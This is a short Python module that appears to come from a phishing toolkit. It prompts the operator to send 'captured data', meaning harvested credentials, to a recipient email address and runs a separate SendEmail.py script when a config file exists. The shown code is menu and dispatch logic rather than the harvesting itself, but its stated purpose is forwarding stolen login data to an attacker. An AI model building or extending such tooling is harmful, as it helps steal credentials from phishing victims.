from Defs.ThemeManager.theme import default_palette
from Defs.ImportManager.unsorted_will_be_replaced import path, system, wait
from Defs.ActionManager.informant import exit_message

def captured_data_email_request(port):  # Ask user to start sending credentials to recipient Email Address.
    choice = input(
        "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'Y' or choice == 'y':
        if path.isfile('Defs/Send_Email/emailconfig.py') == True:
            system('python3 Defs/Send_Email/SendEmail.py')
        else:
            print(
                '[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
            wait(2)
            exit_message(port)
    elif choice == 'N' or choice == 'n':
        exit_message(port)
    else:
        system('clear')
        print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(
            default_palette[0], default_palette[4], default_palette[2]))
        wait(1)
        system('clear')
        return captured_data_email_request(port)